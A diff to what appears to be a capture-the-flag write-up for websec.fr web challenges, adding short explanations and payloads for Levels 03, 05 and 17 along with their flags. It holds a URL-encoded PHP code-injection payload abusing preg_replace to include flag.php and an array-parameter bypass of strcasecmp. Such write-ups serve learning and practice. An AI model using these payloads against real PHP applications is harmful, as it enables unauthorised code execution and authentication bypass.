@@ -20,10 +20,7 @@ It replace 'union', 'order', 'select', 'from', 'group', 'by' to '', so we try
 WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
 ```
 **[Level03](http://websec.fr/level03/)**  
-It's using <i>password_hash</i> and <i>password_verify</i>, but the hash string is special, it start with <i>7c00</i>
-```
-7c00249d409a91ab84e3f421c193520d9fb3674b
-```
+It's using <i>password_hash</i> and <i>password_verify</i>, but the hash string is special, it start with <i>7c00</i> and it use sha1 with <i>fa1se</i> instead of <i>false</i>, so the function will return raw 20 character binary format
 ```
 import hashlib
 import string
@@ -87,10 +84,20 @@ WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
 ```
 
 **[Level05](http://websec.fr/level05/)**  
+It use preg_replace, so we try to include 'flag.php'
 http://websec.fr/level05/index.php?a=flag.php
 ```
 %24%7Binclude_once%09%24_GET%5Ba%5D%7D+%24%7Bflag%7D
 ```
 ```
 WEBSEC{Writing_a_sp3llcheckEr_in_php_aint_no_fun}
+```
+
+**[Level17](http://websec.fr/level17/)**  
+Notice that strcasecmp will return Null if 1 parameter is an array, so we try
+```
+flag[]=a&submit=Go
+```
+```
+WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}
 ```
